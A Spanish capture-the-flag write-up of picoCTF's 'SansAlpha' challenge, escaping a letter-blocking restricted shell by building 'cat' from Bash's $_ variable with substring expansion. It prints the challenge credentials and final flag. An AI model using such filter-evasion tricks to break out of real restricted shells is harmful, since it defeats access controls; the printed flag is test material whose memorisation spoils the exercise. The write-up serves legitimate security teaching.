# SansAlpha

## Descripción

Se proporciona acceso SSH a una shell restringida llamada **SansAlpha**, donde el teclado no permite introducir letras del alfabeto. Únicamente pueden utilizarse números y algunos símbolos.

```bash
ssh -p 50933 ctf-player@mimas.picoctf.net
```

Contraseña:

```text
f3b61b38
```

## Objetivo

Obtener la flag sin poder escribir comandos convencionales como:

```bash
ls
cat
pwd
```

ya que cualquier letra genera:

```text
SansAlpha: Unknown character detected
```

---

## Enumeración

### Descubrir archivos mediante globbing

Ejecutando:

```bash
**
```

obtuvimos:

```text
bash: blargh: command not found
```

Lo que revela la existencia del directorio:

```text
blargh
```

Posteriormente:

```bash
**/*
```

devolvió:

```text
bash: blargh/flag.txt: Permission denied
```

Identificando el archivo objetivo:

```text
blargh/flag.txt
```

---

## Enumeración adicional

```bash
.*
```

Salida:

```text
bash: .: ..: is a directory
```

```bash
./*
```

Salida:

```text
bash: ./blargh: Is a directory
```

---

## Obtención de letras

La pista del reto era:

> Where can you get some letters?

Después de ejecutar:

```bash
./*
```

la variable especial `$_` contenía información útil.

Comprobación:

```bash
$_
```

Salida:

```text
bash: ./on-calastran.txt: Permission denied
```

Esta cadena contiene letras que pueden reutilizarse mediante expansión de variables Bash.

---

## Construcción del comando `cat`

Extrayendo caracteres desde `$_`:

```bash
${_:5:2}
```

Resultado:

```text
ca
```

La posición 10 contiene la letra `t`, por lo que:

```bash
${_:5:2}${_:10:1}
```

genera:

```text
cat
```

---

## Lectura de la flag

Comando final:

```bash
${_:5:2}${_:10:1} ./*/*
```

Salida:

```text
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_640b6add}
```

---

## Flag

```text
picoCTF{7h15_mu171v3r53_15_m4dn355_640b6add}
```

---

## Conceptos aprendidos

- Bash Globbing (`*`, `**`, `?`)
    
- Variables especiales de Bash (`$_`)
    
- Expansión de cadenas `${var:offset:length}`
    
- Restricciones de entrada en shells
    
- Construcción dinámica de comandos
    
- Enumeración en entornos restringidos
    

## Comando clave

```bash
${_:5:2}${_:10:1} ./*/*
```

Este payload reconstruye dinámicamente:

```bash
cat ./*/*
```

sin escribir ninguna letra manualmente.